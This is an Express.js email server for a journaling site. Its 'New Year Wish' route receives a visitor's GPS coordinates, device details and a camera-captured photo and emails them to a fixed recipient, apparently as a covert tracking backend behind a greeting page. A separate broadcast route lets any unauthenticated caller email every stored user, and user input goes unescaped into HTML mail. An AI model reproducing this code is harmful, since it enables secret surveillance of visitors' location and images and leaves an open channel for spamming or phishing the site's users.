require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const app = express();
const port = process.env.PORT || 3000;
const admin = require("firebase-admin");

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

app.use(cors({
    origin: process.env.FRONTEND_URL || '*', // You can restrict this to your domains
}));

const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
    },
});

// 📮 Route 1: Send New Year Wish Email (unchanged)
app.post('/send-email', (req, res) => {
    const { name, wish, deviceInfo, imageCaptured } = req.body;

    let locationText = 'Device information not provided.';
    if (deviceInfo?.location) {
        locationText = `Location: Latitude: ${deviceInfo.location.latitude}, Longitude: ${deviceInfo.location.longitude}`;
    } else if (deviceInfo?.locationError) {
        locationText = `Location Error: ${deviceInfo.locationError}`;
    }

    let imageAttachment = null;
    if (imageCaptured) {
        try {
            const parts = imageCaptured.split(';base64,');
            const mimeType = parts[0].split(':')[1];
            const imageData = parts[1];
            const imageBuffer = Buffer.from(imageData, 'base64');
            imageAttachment = {
                filename: `captured_image.${mimeType.split('/')[1]}`,
                content: imageBuffer,
                contentType: mimeType,
            };
        } catch (error) {
            console.error("Error processing image:", error);
        }
    }

    const mailOptions = {
        from: process.env.EMAIL_USER,
        to: process.env.RECIPIENT_EMAIL,
        subject: `New Year Wish from ${name}`,
        html: `
            <p>Name: ${name}</p>
            <p>Wish: ${wish}</p>
            <p>${locationText}</p>
            ${deviceInfo ? `
                <p>User Agent: ${deviceInfo.userAgent}</p>
                <p>Platform: ${deviceInfo.platform}</p>
                <p>Language: ${deviceInfo.language}</p>
            ` : ''}
        `,
        attachments: imageAttachment ? [imageAttachment] : [],
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error(error);
            return res.status(500).json({ success: false, message: 'Failed to send wish email' });
        }
        console.log('Wish email sent:', info.response);
        res.json({ success: true, message: 'Wish email sent successfully' });
    });
});

// 📮 Route 2: Send Welcome Email to Journal Users
app.post('/send-welcome', (req, res) => {
    const { name, email } = req.body;

    if (!name || !email) {
        return res.status(400).json({ success: false, message: "Name and Email are required." });
    }

   const mailOptions = {
  from: process.env.EMAIL_USER,
  to: email,
  subject: `Welcome to Fragments of Me, ${name}! 💖`,
  html: `
    <div style="font-family: 'Georgia', serif; color: #3c2f2f;">
      <h2 style="color: #a97142;">Hey ${name},</h2>
      <p>Welcome to <strong>Fragments of Me</strong> — a place where stories, thoughts, and emotions come alive.</p>
      <p>We're thrilled to have you here. Whether you're reading, reflecting, or sharing your own pieces, you're now a part of something meaningful.</p>
      <p>Feel free to explore, comment, like, and most importantly — express.</p>
      <p style="margin-top: 20px;">With warmth,<br/>— Salik Pirzada<br/><em>Fragments of Me</em></p>
    </div>
  `
};


    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error("Failed to send welcome email:", error);
            return res.status(500).json({ success: false, message: "Failed to send welcome email." });
        }
        console.log(`✅ Welcome email sent to ${email}`);
        res.json({ success: true, message: "Welcome email sent successfully." });
    });
});

app.post("/send-broadcast", async (req, res) => {
  const { subject, message } = req.body;

  try {
    const usersSnapshot = await admin.firestore().collection("users").get();
    const emails = usersSnapshot.docs
      .map(doc => doc.data().email)
      .filter(email => typeof email === "string" && email.includes("@"));

    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    await Promise.all(
      emails.map(email =>
        transporter.sendMail({
          from: `"Fragments of Me" <${process.env.EMAIL_USER}>`,
          to: email,
          subject,
          text: message,
        })
      )
    );

    res.status(200).json({ success: true });
  } catch (error) {
    console.error("Broadcast error:", error);
    res.status(500).json({ error: "Failed to send email notifications." });
  }
});


app.listen(port, () => {
    console.log(`🚀 Server running on port ${port}`);
});
